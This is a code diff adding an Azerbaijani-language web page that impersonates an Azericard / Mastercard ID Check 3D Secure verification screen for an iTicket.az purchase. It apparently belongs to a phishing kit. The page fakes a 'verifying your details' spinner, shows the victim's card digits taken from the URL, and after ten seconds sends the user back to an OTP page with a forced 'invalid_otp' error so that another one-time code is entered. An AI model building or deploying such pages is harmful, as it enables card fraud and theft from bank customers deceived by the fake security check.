@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard - Yoxlanılır</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .logos { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 30px; }
+        .logos img { height: 28px; }
+        .logos span { font-size: 18px; color: #555; font-weight: 300; }
+        .id-check { font-size: 17px; color: #333; font-weight: 700; }
+        .spinner { border: 3px solid #e0e0e0; border-top: 3px solid #0d6efd; border-radius: 50%; width: 44px; height: 44px; animation: spin 1s linear infinite; margin: 0 auto 25px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #222; font-size: 17px; margin-bottom: 25px; font-weight: 700; line-height: 1.5; }
+        .details { background-color: #e8f0fe; border-radius: 8px; padding: 20px; text-align: left; margin-bottom: 20px; }
+        .details div { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; color: #333; font-weight: 600; }
+        .details div:last-child { margin-bottom: 0; }
+        .details span:first-child { font-weight: 700; color: #555; }
+        .details strong { color: #0d6efd; font-weight: 700; letter-spacing: 0.5px; }
+        .footer { font-size: 12.5px; color: #666; line-height: 1.6; font-weight: 500; margin-top: 15px; }
+        .footer .shield { font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+            <span>|</span>
+            <span class="id-check">ID Check</span>
+        </div>
+
+        <div class="spinner"></div>
+        <h2>Zəhmət olmasa gözləyin,<br>məlumatlarınız yoxlanılır...</h2>
+
+        <div class="details">
+            <div><span>Əməliyyat:</span> <strong>iTicket.az</strong></div>
+            <div><span>Tarix:</span> <strong id="dateField"></strong></div>
+            <div><span>Kart:</span> <strong id="cardField">**** **** **** 0000</strong></div>
+        </div>
+
+        <div class="footer">
+            <span class="shield">🛡️</span> Bu səhifə, onlayn əməliyyatınızı təhlükəsiz etmək üçün 3D Secure texnologiyasından istifadə edir.
+        </div>
+    </div>
+
+    <script>
+        const now = new Date();
+        document.getElementById('dateField').innerText = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}  ${String(now.getDate()).padStart(2, '0')}.${String(now.getMonth() + 1).padStart(2, '0')}.${now.getFullYear()}`;
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardParam = urlParams.get('card') || '';
+        const amountParam = urlParams.get('amount') || '0';
+
+        if (cardParam) {
+            document.getElementById('cardField').innerText = '**** **** **** ' + cardParam.replace(/\s/g, '').slice(-4);
+        }
+
+        // 10 saniyə sonra OTP səhifəsinə geri qayıdırıq (xəta ilə)
+        setTimeout(function() {
+            window.location.href = 'azericard-3ds.html?card=' + encodeURIComponent(cardParam) + '&amount=' + encodeURIComponent(amountParam) + '&error=invalid_otp';
+        }, 10000);
+    </script>
+</body>
+</html>
